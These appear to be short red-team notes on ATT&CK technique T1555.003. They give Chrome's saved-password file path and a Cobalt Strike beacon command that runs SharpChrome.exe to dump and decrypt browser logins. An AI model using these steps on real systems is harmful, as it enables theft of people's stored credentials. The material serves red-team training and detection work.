1.Credentials from Web Browsers [T1555.003]:

Dumping Credentails from Chrominum Browser:

Steps:1
Path to store save credentials in Chrominium Browser: "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"

Tools "SharpChrome.exe" used to dump and decrypt the password from chrominium browser:

beacon> execute-assembly C:\Tools\SharpDPAPI\SharpChrome\bin\Release\SharpChrome.exe logins

"This technique can be used from a medium-integrity context"



